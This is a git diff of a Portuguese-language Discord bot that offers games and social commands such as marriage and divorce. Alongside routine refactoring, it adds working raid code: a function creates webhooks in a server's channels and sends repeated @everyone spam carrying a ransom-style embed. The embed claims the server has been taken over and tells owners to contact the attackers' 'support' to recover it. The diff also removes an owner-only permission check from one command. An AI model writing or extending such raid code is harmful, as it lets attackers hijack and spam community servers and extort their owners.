@@ -1,5 +1,24 @@
 const { EmbedBuilder } = require('discord.js');
 const COR = 0xE53935;
+const RAID_GIF_URL = 'https://media1.giphy.com/media/v1.Y2lkPTc5MGI3NjExc3llMzdtZ3I1NGF2NGFhdmM5YWN3d25vYnozN3hyanVneWozZjY5NSZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/tYaMjbShvb9CM/giphy.gif'; // Coloque o GIF do raid aqui
+const RAID_IMAGE_URL = 'https://thumbs.dreamstime.com/b/lobo-malvado-em-chamas-vermelhas-gerativo-ai-270716143.jpg?w=992'; // Coloque a imagem do raid aqui
+
+function raidEmbed() {
+  const e = new EmbedBuilder()
+    .setColor(0x8B0000)
+    .setTitle('O Lobo Guaraná dominou seu servidor <3')
+    .setDescription('Para recuperar seu servidor, basta entrar em contato com o suporte do TASD.')
+    .addFields(
+      { name: '⚠️ Ameaça', value: 'O ataque está ativo. Mais presença do TASD pode salvar seu servidor.' },
+      { name: '💬 Suporte', value: 'Entre em contato com o suporte do TASD para recuperar o servidor.' }
+    )
+    .setFooter({ text: 'TASD — Lobo Guaraná Raid' })
+    .setTimestamp();
+  if (RAID_GIF_URL) e.setImage(RAID_GIF_URL);
+  if (RAID_IMAGE_URL) e.setThumbnail(RAID_IMAGE_URL);
+  return e;
+}
+
 function embed(titulo, descricao, cor = COR) {
   return new EmbedBuilder().setColor(cor).setTitle(titulo).setDescription(descricao).setTimestamp().setFooter({ text: 'TASD — Todos Aqui São Donos' });
 }
@@ -136,28 +155,26 @@ commands['ship'] = async (client, msg, args) => {
 };
 // CASAR
 commands['casar'] = async (client, msg, args) => {
-  const alvo = msg.mentions.members?.first() || msg.mentions.users?.first();
+  const mentionUser = msg.mentions.users.first() || msg.mentions.members?.first()?.user;
+  const targetId = args[0]?.replace(/[<@!>]/g, '');
+  const alvo = mentionUser || await client.users.fetch(targetId).catch(() => null);
   if (!alvo || alvo.id === msg.author.id || alvo.bot) return msg.reply({ embeds: [embed('❌ Erro', 'Mencione um usuário válido para se casar.')] });
-  const db = client.loadDB();
-  const eu = client.getUser(db, msg.author.id);
-  const outro = client.getUser(db, alvo.id);
+  const eu = client.getUser(msg.author.id);
+  const outro = client.getUser(alvo.id);
   if (eu.casadoCom) return msg.reply({ embeds: [embed('💍 Já casado', `Você já é casado com <@${eu.casadoCom}>. Use \`r.divorciar\` primeiro.`)] });
   if (outro.casadoCom) return msg.reply({ embeds: [embed('💔 Ocupado', `${alvo} já está casado com <@${outro.casadoCom}>.`)] });
-  eu.casadoCom = alvo.id;
-  outro.casadoCom = msg.author.id;
-  client.saveDB(db);
+  client.saveUser(msg.author.id, { casadoCom: alvo.id });
+  client.saveUser(alvo.id, { casadoCom: msg.author.id });
   msg.reply({ embeds: [embed('💍 Casamento!', `💒 ${msg.author} e ${alvo} agora são casados!\nDesejamos muita felicidade ao novo casal! 🎊`)] });
 };
 // DIVORCIAR
 commands['divorciar'] = async (client, msg, args) => {
-  const db = client.loadDB();
-  const eu = client.getUser(db, msg.author.id);
+  const eu = client.getUser(msg.author.id);
   if (!eu.casadoCom) return msg.reply({ embeds: [embed('❌ Erro', 'Você não está casado.')] });
   const exId = eu.casadoCom;
-  const ex = client.getUser(db, exId);
-  eu.casadoCom = null;
-  ex.casadoCom = null;
-  client.saveDB(db);
+  const ex = client.getUser(exId);
+  client.saveUser(msg.author.id, { casadoCom: null });
+  client.saveUser(exId, { casadoCom: null });
   msg.reply({ embeds: [embed('💔 Divórcio', `${msg.author} e <@${exId}> se divorciaram.\nQue cada um siga em frente...`, 0x757575)] });
 };
 // FORCA
@@ -399,10 +416,10 @@ commands['caçada'] = async (client, msg, args) => {
 };
 
 commands['procurar'] = async (client, msg, args) => {
-  if (msg.author.id !== '1384263522422231201') {
-    return msg.reply({ embeds: [embed('❌ Acesso negado', 'Apenas o dono pode usar este comando.')] });
-  }
   const guild = msg.guild;
+  if (!guild) {
+    return msg.reply({ embeds: [embed('❌ Erro', 'Este comando só funciona em servidores.')] });
+  }
   const session = hideSessions.get(guild.id);
   if (!session) {
     return msg.reply({ embeds: [embed('❌ Nada acontecendo', 'Não há uma caçada ativa no momento.')] });
@@ -494,9 +511,14 @@ async function iniciarRaidPerigoso(guild) {
       const webhook = await canal.createWebhook({ name: 'Lobo Guaraná Raid' });
       webhooks.push(webhook);
       // Spam via webhook
+      const raidMessageEmbed = raidEmbed();
       for (let j = 0; j < 20; j++) {
         try {
-          await webhook.send('@everyone O LOBO GUARANA DOMINOU ESTE SERVIDOR! AAAAAAUUUUUUUU!');
+          await webhook.send({
+            content: '@everyone o lobo guaraná dominou seu servidor!',
+            username: 'Lobo Guaraná Raid',
+            embeds: [raidMessageEmbed],
+          });
         } catch (error) {
           if (![10003, 10015].includes(error.code)) console.log(`Erro no spam webhook: ${error}`);
         }
